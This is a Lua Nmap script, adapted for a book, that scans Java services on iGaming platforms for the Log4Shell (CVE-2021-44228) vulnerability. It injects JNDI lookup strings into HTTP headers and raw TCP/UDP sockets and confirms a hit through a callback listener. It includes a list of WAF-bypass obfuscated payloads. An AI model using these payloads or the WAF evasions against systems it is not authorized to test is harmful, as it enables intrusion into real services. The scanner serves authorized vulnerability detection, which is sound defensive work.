-- Log4Shell Vulnerability Scanner for iGaming Infrastructure
-- Based on CVE-2021-44228 detection methodology
--
-- CONTEXT: This NSE (Nmap Scripting Engine) script was used during the
-- December 2021 Log4Shell crisis to rapidly scan iGaming platform services
-- for the vulnerability. Online gambling platforms were high-value targets
-- because they run Java-based backend services (game servers, payment
-- gateways, player management) that commonly use Log4j for logging.
--
-- HOW IT WORKS: The script injects JNDI lookup strings into HTTP headers.
-- If the target application logs any of these headers using a vulnerable
-- Log4j version, it will attempt to resolve the JNDI URI -- triggering a
-- callback to a listener that confirms the vulnerability exists.
--
-- USAGE (in a controlled/authorized environment only):
--   1. Start a callback listener:
--        ncat -vkl 1389
--   2. Run the scan:
--        nmap --script log4shell_scanner.nse \
--          --script-args log4shell_scanner.callback-server=192.0.2.10:1389 \
--          -p 8080,8443,443 203.0.113.0/24
--
-- SANITIZATION NOTE: All IPs in this file use RFC 5737 documentation ranges.
-- Original script by Giuseppe Di Terlizzi, adapted for book context.

description = [[
Log4Shell (CVE-2021-44228) Scanner - iGaming Infrastructure Edition

Detects Apache Log4j 2 RCE vulnerability by injecting JNDI lookup payloads
into HTTP headers commonly logged by Java application servers.

iGaming-specific considerations:
- Game provider integration endpoints often run Tomcat/Spring Boot
- Payment gateway services frequently use Log4j for transaction logging
- Back-office admin panels are common Java applications
- Player authentication services log request headers for audit trails

The script sends crafted JNDI strings via multiple HTTP headers and relies
on a callback server to confirm exploitation. Any firewall rules or WAF
configurations will affect detection accuracy.

Setup:
  ncat -vkl 1389
  nmap --script log4shell_scanner.nse \
    --script-args log4shell_scanner.callback-server=192.0.2.10:1389 \
    -p 8080 198.51.100.50
]]

-- Required Nmap libraries
local http      = require "http"
local string    = require "string"
local table     = require "table"
local nmap      = require "nmap"
local stdnse    = require "stdnse"
local shortport = require "shortport"

-- Test modes available
local TESTS = { 'all', 'http', 'tcp', 'udp' }

-- HTTP methods to test
local HTTP_METHODS = { 'GET', 'HEAD', 'POST', 'OPTIONS' }

-- Headers commonly logged by iGaming Java applications.
-- Many of these are logged for audit, fraud detection, or debugging.
-- In gambling platforms, headers like Authorization, X-Forwarded-For,
-- and User-Agent are almost always logged for regulatory compliance.
local HTTP_HEADERS = {
    'X-Api-Version',           -- Common in game provider APIs
    'User-Agent',              -- Always logged for analytics
    'Cookie',                  -- Session tracking
    'Referer',                 -- Traffic source tracking
    'Accept-Language',         -- Geo/locale detection
    'Accept-Encoding',
    'Origin',                  -- CORS / anti-fraud
    'X-Requested-With',        -- AJAX detection
    'X-CSRF-Token',            -- Security token header
    'Authorization',           -- Auth tokens (always logged in gambling)
    'X-Forwarded-For',         -- Real IP behind CDN/load balancer
    'X-Real-IP',               -- Nginx proxy header
    'Content-Type',
    'X-Correlation-ID',        -- Distributed tracing
    'X-Request-ID',            -- Request tracking
}

-- Standard JNDI payload
local DEFAULT_PAYLOAD = '${jndi:ldap://%s}'

-- WAF bypass variants. iGaming platforms commonly sit behind Cloudflare,
-- AWS WAF, or Akamai. These obfuscation techniques attempt to bypass
-- WAF rules that block the literal string "${jndi:ldap://".
local WAF_BYPASS_PAYLOADS = {
    -- LDAP variants with case obfuscation
    '${jndi:ldap://%s}',
    '${${lower:jndi}:${lower:ldap}://%s}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',

    -- RMI variants (alternative JNDI provider)
    '${jndi:rmi://%s}',
    '${${lower:jndi}:${lower:rmi}://%s}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',

    -- DNS variants (useful when LDAP/RMI are blocked at network level)
    '${jndi:dns://%s}',
    '${${lower:jndi}:${lower:dns}://%s}',
}


--- Utility: check if a value exists in a table
function contains(t, item, array)
    local iter = array and ipairs or pairs
    for k, val in iter(t) do
        if val == item then
            return true, k
        end
    end
    return false, nil
end


--- Utility: split string by delimiter
function strsplit(pattern, text)
    local list, pos = {}, 1
    assert(pattern ~= "", "delimiter matches empty string!")
    while true do
        local first, last = string.find(text, pattern, pos)
        if first then
            list[#list + 1] = string.sub(text, pos, first - 1)
            pos = last + 1
        else
            list[#list + 1] = string.sub(text, pos)
            break
        end
    end
    return list
end


-- Port rule: run on any port (game servers use non-standard ports)
portrule = function(host, port)
    return true
end


-- Main action: inject JNDI payloads and report
action = function(host, port)
    -- Script arguments
    local callback_server  = stdnse.get_script_args(SCRIPT_NAME .. '.callback-server')
                             or '192.0.2.10:1389'
    local waf_bypass       = stdnse.get_script_args(SCRIPT_NAME .. '.waf-bypass') or nil
    local http_headers_arg = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
    local http_method      = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
    local url_path         = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
    local test_method      = stdnse.get_script_args(SCRIPT_NAME .. '.test-method') or 'http'

    if not contains(TESTS, test_method) then
        stdnse.print_verbose("Skipping '%s' %s, unknown test-method",
                             SCRIPT_NAME, SCRIPT_TYPE)
        return nil
    end

    local payloads = { DEFAULT_PAYLOAD }
    local output = stdnse.output_table()

    if waf_bypass ~= nil then
        payloads = WAF_BYPASS_PAYLOADS
    end

    output.Callback = callback_server
    output.Payloads = {}

    -- === HTTP-based testing ===
    -- This is the primary method for iGaming services: most game provider
    -- APIs, payment endpoints, and admin panels are HTTP/HTTPS services.
    if test_method == 'http' or test_method == 'all' then
        output['Test Method'] = 'HTTP'

        if shortport.http(host, port) then
            if not contains(HTTP_METHODS, http_method:upper()) then
                stdnse.verbose1("Skipping '%s' %s, unknown HTTP method",
                                SCRIPT_NAME, SCRIPT_TYPE)
                return nil
            end

            local http_headers = HTTP_HEADERS
            output['URL Path']     = url_path
            output['HTTP Method']  = http_method
            output['HTTP Headers'] = {}

            if http_headers_arg ~= nil then
                http_headers = strsplit(',', http_headers_arg)
            end

            -- Iterate through all payloads and headers
            for i, payload in ipairs(payloads) do
                local exploit_payload = string.format(payload, callback_server)
                output.Payloads[#output.Payloads + 1] = exploit_payload

                for x, payload_header in ipairs(http_headers) do
                    stdnse.print_debug(1, string.format('%s --> %s',
                                       payload_header, exploit_payload))

                    local header = { [payload_header] = exploit_payload }
                    local response = http.generic_request(
                        host, port.number, http_method:upper(), url_path,
                        { header = header, no_cache = true }
                    )

                    local status = response.status
                    if status ~= nil then
                        local status_string = http.get_status_string(response)
                        output['HTTP Headers'][payload_header] = status_string
                    end
                end
            end

            output.Note = string.format(
                '(!) Check callback server (%s) or application (%s:%s) logs',
                callback_server, host.ip, port.number
            )
            return output
        end
    end

    -- === Socket-based testing (TCP/UDP) ===
    -- Some iGaming services use raw TCP: game state synchronization,
    -- proprietary binary protocols for live dealer feeds, etc.
    if test_method == 'tcp' or test_method == 'udp' or test_method == 'all' then
        if test_method ~= 'all' and port.protocol ~= test_method then
            return nil
        end

        output['Test Method'] = string.format('Socket (%s)', port.protocol)

        if not shortport.http(host, port) then
            for i, payload in ipairs(payloads) do
                local exploit_payload = string.format(payload, callback_server)
                output.Payloads[#output.Payloads + 1] = exploit_payload

                local socket = nmap.new_socket(port.protocol)
                socket:set_timeout(host.times.timeout * 1000)
                socket:connect(host, port)
                local status, err = socket:send(exploit_payload)
                socket:close()
            end

            output.Note = string.format(
                '(!) Check callback server (%s) or application (%s:%s) logs',
                callback_server, host.ip, port.number
            )
            return output
        end
    end
end
